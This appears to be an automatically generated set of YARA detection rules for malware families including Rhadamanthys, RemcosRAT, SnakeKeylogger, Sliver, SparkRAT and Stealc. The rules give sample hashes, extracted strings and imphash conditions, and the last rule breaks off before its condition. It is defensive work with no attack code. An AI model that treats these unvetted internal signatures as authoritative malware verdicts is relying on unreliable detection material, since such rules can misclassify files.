rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__32cfff30_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_6 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash2 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $x1 = "<msiOptions> - options for msiexec.exe on running the MSI package" fullword wide /* score: '32.00'*/
      $s2 = "Unsupported command file format. The supported file formats are: ANSI, UTF-8, Unicode Little Endian and Unicode Big Endian. The " wide /* score: '30.00'*/
      $s3 = "#- launches the EXE setup without UI&- launches the EXE setup with basic UI'- list languages supported by the setup?<lang_id> - " wide /* score: '26.00'*/
      $s4 = "Setup package was encrypted using AES 256 algorithm. To continue the setup process, you should provide the password needed to de" wide /* score: '25.00'*/
      $s5 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxPlaceHolderForegroundFocusedPressed}}\" />" fullword ascii /* score: '23.00'*/
      $s6 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxForegroundDisabled}}\" />" fullword ascii /* score: '23.00'*/
      $s7 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxForegroundFocused}}\" />" fullword ascii /* score: '23.00'*/
      $s8 = "                <!-- <PointerUpThemeAnimation Storyboard.TargetName=\"ContentPresenter\"/>-->" fullword ascii /* score: '23.00'*/
      $s9 = "<ObjectAnimationUsingKeyFrames Storyboard.TargetName=\"ContentPresenter\" Storyboard.TargetProperty=\"BorderThickness\">" fullword ascii /* score: '22.00'*/
      $s10 = "SurfsharkSetup.exe" fullword wide /* score: '22.00'*/
      $s11 = "eSource={RelativeSource Mode=TemplatedParent}, TargetNullValue={ThemeResource TextControlPlaceholderForegroundFocused}}\" />" fullword ascii /* score: '21.00'*/
      $s12 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s13 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s14 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s15 = "                        <DiscreteObjectKeyFrame KeyTime=\"0\" Value=\"{Binding PlaceholderForeground, RelativeSource={RelativeSo" ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__b7b7d002_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_7 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash2 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
   strings:
      $x1 = "owner diedschedtracesemacquiresetsockoptws2_32.dll  of size  CloseHandleCreateFileWDeleteFileWExitProcessFreeLibraryGOTRACEBACKG" ascii /* score: '71.00'*/
      $x2 = "file descriptor in bad stateprotocol driver not attachedruntime: bad lfnode address executing on Go runtime stackmachine is not " ascii /* score: '42.00'*/
      $x3 = "connection refusedfile name too longgarbage collectionidentifier removedinput/output errormultihop attemptedno child processesno" ascii /* score: '37.00'*/
      $x4 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC worker (idle)GetComputerNameWGetFullPathNameWGetLongPathNameWNetApiBufferFree" ascii /* score: '35.00'*/
      $x5 = "dllfile existsgccheckmarkgetpeernamegetsocknamemswsock.dllnot reachedscheddetailsecur32.dllshell32.dlluserenv.dll gcscandone Get" ascii /* score: '32.00'*/
      $x6 = "wrong medium type  but memory size  to non-Go memory CommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLoo" ascii /* score: '31.00'*/
      $x7 = "ingGetCurrentProcessGetShortPathNameWLookupAccountSidWWSAEnumProtocolsWexec format errorno data availablepermission deniedruntim" ascii /* score: '31.00'*/
      $s8 = "exchange fullgethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '30.00'*/
      $s9 = "lchan receivedumping heapgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllnetapi32.dll gcscanvalid  is ni" ascii /* score: '29.00'*/
      $s10 = "GOMAXPROCSGetIfEntryGetVersionWSACleanupWSAStartup_MSpanDead_MSpanFreednsapi.dllgetsockoptinvalidptrntdll.dll" fullword ascii /* score: '28.00'*/
      $s11 = "connection refusedfile name too longgarbage collectionidentifier removedinput/output errormultihop attemptedno child processesno" ascii /* score: '28.00'*/
      $s12 = "level 3 resetsrmount errortimer expiredvalue method  out of range  procedure in CertCloseStoreCreateProcessWCryptGenRandomFindFi" ascii /* score: '27.00'*/
      $s13 = "owner diedschedtracesemacquiresetsockoptws2_32.dll  of size  CloseHandleCreateFileWDeleteFileWExitProcessFreeLibraryGOTRACEBACKG" ascii /* score: '27.00'*/
      $s14 = "etCurrentProcessIdGetTokenInformationWaitForSingleObjectbad file descriptordevice not a streamdirectory not emptydisk quota exce" ascii /* score: '26.00'*/
      $s15 = "wrong medium type  but memory size  to non-Go memory CommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLoo" ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31_imphash__Rhadamanthys_signature__68c812220ef41a1bea0980e196c18e31__8 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash).exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_4f5e6187.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_c01146e6.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_ca3808c8.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_cad617ba.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_dd76c465.exe, Rhadamanthys(signature)_68c812220ef41a1bea0980e196c18e31(imphash)_df1ddaa4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a45a493722c85d25bc49c736120289bab6f4be902b648291bd33d992c07c61fd"
      hash2 = "4f5e618734015c7f646763a77be4bcdd8ed8111ae65939ead38a5acf74bb792a"
      hash3 = "c01146e63188972b6d9910aa9f72fbdcfd5aacc173387c79c6a775bd269c3d69"
      hash4 = "ca3808c8ff949235e3d5d547976d4b2e2bedc6b5916b0b69a798372718ecaab9"
      hash5 = "cad617ba9eff8430c285edc632632e13f72d8faff8330cacf5f71c299e96e4fc"
      hash6 = "dd76c4658847db272b8caa3140a94a810a69aec754c29f1085f41fa6bdf53d20"
      hash7 = "df1ddaa42895db3dc767b687902296dc841c352bbfe55674292e8cbc678a9b61"
   strings:
      $s1 = ".get] j_Q_Q_e.VH-OwpV T.G.z.Vk_f.x T b B_b* K E_cZ.G_FK B" fullword ascii /* score: '16.00'*/
      $s2 = "* Z/_K.H_Vb.hil.i.w8_u Lm0 z.t.2_dr C.5_" fullword ascii /* score: '12.00'*/
      $s3 = "R.Z.M B%Cs% H)t?_fw_X_y^_F|_n_M:_B.z j* d].e b_GL m b.T y.p.Puf c.q_Z f.2n" fullword ascii /* score: '12.00'*/
      $s4 = "T^_p K.iE.V O.lZA i.j_G.0.KWMfTpv.p.U.X_D)" fullword ascii /* score: '12.00'*/
      $s5 = "c Q_BJPV_f_P M q.D_p.2.V+|.1.2.i.S>U t n\\w U.k=_b.YMt W_a- t.F$ Q.p.Bh Hp_p@_R m_O_" fullword ascii /* score: '11.00'*/
      $s6 = ".0.xN m Z.rnQ B.Kk drsi j.PsK.v.N a* j F.c.e&_bb I.f{.hs m: b.5pL_" fullword ascii /* score: '11.00'*/
      $s7 = "j C n* y_f_P_d N.7 u.A.b m.nqJ_y_A.U_j.SPL,.k_a H.p.spND,.3.XY.Z q_m.W1 s p B8_" fullword ascii /* score: '11.00'*/
      $s8 = "_Y.0.k.0_X kU.Jd`.y.GcCn:r_W.GAe.5.9+ vd_h.zT{_G_iX_M_f.vj_w." fullword ascii /* score: '11.00'*/
      $s9 = "- zc_M bV1.y_H.f_X C42OW<.t.X_Q.l_RK# X_H_g.qeXF P I F m_q K0 q.x s p_i).z.Te.G.WWA E+B on W.p_" fullword ascii /* score: '11.00'*/
      $s10 = "d C.8)_PX[> h.j1T- z.p.YC_Kx.A_SIN.tNxs.7.rp.IuFa.E.j.CQhr.2.m V@ HD.Zmx W.P: l" fullword ascii /* score: '11.00'*/
      $s11 = "e T_i.w.2.Y>.X%G.X.7.l_ls.3`.jVXA.t d x`K.O2i3_p_r+ q S_hV.V)c$.bkq iB.O F7k" fullword ascii /* score: '11.00'*/
      $s12 = "Lf.D U.u%.l.93n.d F!_O.L- o.OfU.w.H_M wm8[.e.K.W ardy A_t~.l MK A4." fullword ascii /* score: '11.00'*/
      $s13 = "Mi Y A.Npa T.j I.b.V.90_Z.w| D_T_K_lXA* XB_J O.x_C YP_OYUT.t K.l.G_P_G r_x W.lz.T$u.O f_h " fullword ascii /* score: '11.00'*/
      $s14 = "_l+ QJdl k.M Y};.jCS bN.1.G.b_e L_NX.V.h z W.cQ_I d.Y.e.L" fullword ascii /* score: '11.00'*/
      $s15 = "l_V E.I.I_d b pp d V.wn_j_q fU.KeY C_f.mJ.J#,.n z_b_h.E?[jO dC L.e.ZXyn.A_f.S" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "68c812220ef41a1bea0980e196c18e31" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__f8676c0eabd52438a3e9d250ae4ce9d9_i_9 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "The Process object must have the UseShellExecute property set to false in order to start a process as a user" fullword wide /* score: '29.00'*/
      $s2 = "@System.Security.Cryptography.dllFSystem.Private.Reflection.Execution" fullword ascii /* score: '28.00'*/
      $s3 = "<System.Diagnostics.Process.dll&System.Formats.Asn1" fullword ascii /* score: '27.00'*/
      $s4 = "UnhandledUnaryHUserDefinedOpMustHaveConsistentTypesHUserDefinedOpMustHaveValidReturnTypeNLogicalOperatorMustHaveBooleanOperators" ascii /* score: '26.00'*/
      $s5 = "        publickekeytokenublickeyretargetrgetablecontentttenttypewindowsrsruntime," fullword wide /* score: '26.00'*/
      $s6 = "The Process object must have the UseShellExecute property set to false in order to redirect IO streams" fullword wide /* score: '26.00'*/
      $s7 = "The Process object must have the UseShellExecute property set to false in order to use environment variables" fullword wide /* score: '26.00'*/
      $s8 = "hSystem.Runtime.CompilerServices.IStrongBox.get_ValuehSystem.Runtime.CompilerServices.IStrongBox.set_ValueP<InitializeTlsBuckets" ascii /* score: '25.00'*/
      $s9 = "BSystem.Collections.NonGeneric.dll@System.ComponentModel.Primitives" fullword ascii /* score: '25.00'*/
      $s10 = "hSystem.Runtime.CompilerServices.IStrongBox.get_ValuehSystem.Runtime.CompilerServices.IStrongBox.set_ValueP<InitializeTlsBuckets" ascii /* score: '25.00'*/
      $s11 = ".StartWithShellExecuteEx8GetShowWindowFromWindowStyle" fullword ascii /* score: '23.00'*/
      $s12 = ".System.Formats.Asn1.dll" fullword ascii /* score: '23.00'*/
      $s13 = "<SelectAll>d__3R<<ExecuteQueryInto>g__GetResultset|13_0>d" fullword ascii /* score: '23.00'*/
      $s14 = "BSystem.Collections.Concurrent.dll:System.Collections.NonGeneric" fullword ascii /* score: '22.00'*/
      $s15 = "RestSharp.dll<System.Text.RegularExpressions" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and pe.imphash() == "f8676c0eabd52438a3e9d250ae4ce9d9" and ( 8 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_10 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
   strings:
      $s1 = "net/http.(*http2clientConnReadLoop).processHeaders" fullword ascii /* score: '23.00'*/
      $s2 = "crypto/tls.(*ecdheKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s3 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s4 = "crypto/tls.rsaKeyAgreement.processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s5 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s6 = "crypto/tls.(*rsaKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s7 = "net/http.(*http2Framer).logWrite" fullword ascii /* score: '19.00'*/
      $s8 = "net/http.(*http2Transport).logf" fullword ascii /* score: '19.00'*/
      $s9 = "q*func(*tls.Config, *tls.Certificate, *tls.clientHelloMsg, *tls.serverHelloMsg) (*tls.serverKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s10 = "*x509.SystemRootsError" fullword ascii /* score: '19.00'*/
      $s11 = "f*func(*tls.Config, *tls.clientHelloMsg, *x509.Certificate) ([]uint8, *tls.clientKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s12 = "p*func(*tls.Config, *tls.clientHelloMsg, *tls.serverHelloMsg, *x509.Certificate, *tls.serverKeyExchangeMsg) error" fullword ascii /* score: '19.00'*/
      $s13 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
      $s14 = "math.Log" fullword ascii /* score: '19.00'*/
      $s15 = "crypto/x509.SystemRootsError.Unwrap" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_11 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash7 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash8 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash9 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash10 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash11 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
      hash12 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $x1 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $x2 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $s3 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s4 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s9 = "Failed to allocate memory in target process" fullword wide /* score: '24.00'*/
      $s10 = "Format of the executable (.exe) or library (.dll) is invalid" fullword wide /* score: '24.00'*/
      $s11 = "icuuc.dll" fullword wide /* score: '23.00'*/
      $s12 = "icuin.dll" fullword wide /* score: '23.00'*/
      $s13 = "The specified TaskContinuationOptions combined LongRunning and ExecuteSynchronously.  Synchronous continuations should not be lo" wide /* score: '21.00'*/
      $s14 = "4SplitWithoutPostProcessing@" fullword ascii /* score: '20.00'*/
      $s15 = "System.Runtime.CompilerServices.RuntimeFeature.IsDynamicCodeSupported" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1d67dace_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_12 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1d67dace.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_870d065b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1d67dacec099bf03c40fcb8320ea5fe18a36113511f2602ce0024ec42c709713"
      hash2 = "870d065bd083e30edfa0d9f8c1dbad6c2ad69ae46d4bb9a29b786a560936900a"
   strings:
      $x1 = "C:\\Users\\asus\\source\\repos\\CafeOtomasyon\\CafeOtomasyon\\bin\\Debug\\Settings.txt" fullword wide /* score: '32.00'*/
      $s2 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '28.00'*/
      $s3 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '28.00'*/
      $s4 = "System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, S" ascii /* score: '27.00'*/
      $s5 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Font, System.Drawing, Version=4." ascii /* score: '27.00'*/
      $s6 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s7 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADa" fullword ascii /* score: '27.00'*/
      $s8 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aySystem.Windows.Forms.Im" ascii /* score: '27.00'*/
      $s9 = "gSystem.Drawing.SizeF, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aySystem.Windows.Forms.Im" ascii /* score: '27.00'*/
      $s10 = "System.Windows.Forms.FormStartPosition, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089h" ascii /* score: '27.00'*/
      $s11 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '25.00'*/
      $s12 = "rawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.Padding, System.Windows.Forms, Ve" ascii /* score: '24.00'*/
      $s13 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADP" fullword ascii /* score: '24.00'*/
      $s14 = "0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3auSystem.Windows.Forms.ImeMode, System.Windows.Forms, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s15 = "ageLayout, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.D" ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Stealc_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__To_see_signature__40ab50289f7ef5fae60801f88d4541fc_imphash__To__13 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe, To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash).exe, To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash)_d6f78448.exe, To-see(signature)_40ab50289f7ef5fae60801f88d4541fc(imphash)_e93683f6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "828018b62e9aea7499623c04bc8a04634f083bf8f74026a0421fc4a79d900fd4"
      hash2 = "065eda9467973645f197c2a3e4e5c7e78f7eb96c42c3ece83ba17797a9a6b7e7"
      hash3 = "d6f7844862855bcff0732306a30c1ed572f2500d7c6ccec66f0320e06d2b6fdd"
      hash4 = "e93683f61cf5f0bc491d7c7398d925c9ad340cfdd45832d9d6c6ebf4e1c40ed5"
   strings:
      $x1 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x2 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $x3 = "<file name=\"comctl32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '31.00'*/
      $s4 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s5 = "<file name=\"netutils.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s6 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s7 = "<file name=\"mpr.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" fullword ascii /* score: '28.00'*/
      $s8 = "FHeaderProcessed" fullword ascii /* score: '20.00'*/
      $s9 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s10 = "OnExecutexAF" fullword ascii /* score: '18.00'*/
      $s11 = "For more detailed information, please visit https://jrsoftware.org/ishelp/index.php?topic=setupcmdline" fullword wide /* score: '18.00'*/
      $s12 = "7VAR and OUT arguments must match parameter type exactly\"%s (Version %d.%d, Build %d, %5:s):%s Service Pack %4:d (Version %1:d." wide /* score: '15.50'*/
      $s13 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s14 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
      $s15 = "AppMutex" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and pe.imphash() == "40ab50289f7ef5fae60801f88d4541fc" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1a721d6a_Rhadamanthys_signature__f34d5f2d4577ed6d9ceec516c1f_14 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a721d6a.exe, Rhadamanthys(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_107dc46a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1a721d6ad75d5a0f8f2599c661aaca62508771f4bba84e93f8401d39470c0432"
      hash2 = "107dc46aadf806fd0eebb2ebf665f74151c67924aa8a2f61901e61004b3af471"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3azSystem.Collections.Speci" ascii /* score: '27.00'*/
      $s2 = "alized.StringCollection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089PADPABj" fullword ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3azSystem.Collections.Speci" ascii /* score: '27.00'*/
      $s4 = "ExecuteNonQueryCommand" fullword wide /* score: '26.00'*/
      $s5 = "Override this property and provide custom screentip template description in DesignTime." fullword wide /* score: '22.00'*/
      $s6 = "SELECT * FROM UPLOADPROFILE_TEMPLATE WHERE GROUPCUSTOMERTRAVELLER='1' ORDER BY GROUPINDEX,ORDERNO" fullword wide /* score: '17.00'*/
      $s7 = "SELECT * FROM UPLOADPROFILE_TEMPLATE WHERE GROUPCUSTOMERTRAVELLER='2' ORDER BY GROUPINDEX,ORDERNO" fullword wide /* score: '17.00'*/
      $s8 = "SELECT * FROM UPLOADPROFILEAGENT" fullword wide /* score: '15.00'*/
      $s9 = "REFINVNO_" fullword wide /* base64 encoded string 'DAH5SN' */ /* score: '14.00'*/
      $s10 = "SELECT * FROM CHARGE WHERE CHARGETYPE='CC'" fullword wide /* score: '13.00'*/
      $s11 = "SELECT UPLOADPROFILE_TEMPLATE.GROUPNAME,UPLOADPROFILE_TEMPLATE.LABELNAME,UPLOADPROFILE_TEMPLATE.FIELDNAME,UPLOADPROFILE_TEMPLATE" wide /* score: '13.00'*/
      $s12 = " AND GROUPCUSTOMERTRAVELLER='2') ORDER BY UPLOADPROFILE_TEMPLATE.ORDERNO" fullword wide /* score: '13.00'*/
      $s13 = "SELECT UPLOADPROFILE_TEMPLATE.GROUPNAME,UPLOADPROFILE_TEMPLATE.LABELNAME,UPLOADPROFILE_TEMPLATE.FIELDNAME,UPLOADPROFILE_TEMPLATE" wide /* score: '13.00'*/
      $s14 = " AND GROUPCUSTOMERTRAVELLER='1') ORDER BY UPLOADPROFILE_TEMPLATE.ORDERNO" fullword wide /* score: '13.00'*/
